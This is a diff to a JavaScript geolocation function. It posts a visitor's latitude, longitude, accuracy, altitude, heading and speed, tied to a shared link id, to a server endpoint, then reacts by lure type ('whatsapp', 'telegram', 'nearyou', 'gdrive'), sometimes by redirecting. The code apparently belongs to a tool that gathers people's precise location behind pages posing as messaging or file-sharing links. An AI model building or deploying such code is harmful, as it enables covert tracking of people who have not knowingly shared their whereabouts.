@@ -1,4 +1,4 @@
-function locate()
+function locate(type = 'whatsapp')
 {
   if(navigator.geolocation)
   {
@@ -25,7 +25,19 @@ function locate()
       // url: '/php/result.php',
       url: '/saveLocationData',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, urlId: sharedId},
-      success: function(){popup();},
+      success: function(){
+        if(type == 'whatsapp'){
+          popup();
+        } else if(type == 'telegram'){
+          popup();
+        } else if(type == 'nearyou'){
+          $('#change').html('Coming Soon');
+        } else if(type == 'gdrive'){
+          window.location='http://example.com';
+        } else {
+          popup();
+        }
+      },
       mimeType: 'text'
     });
   };
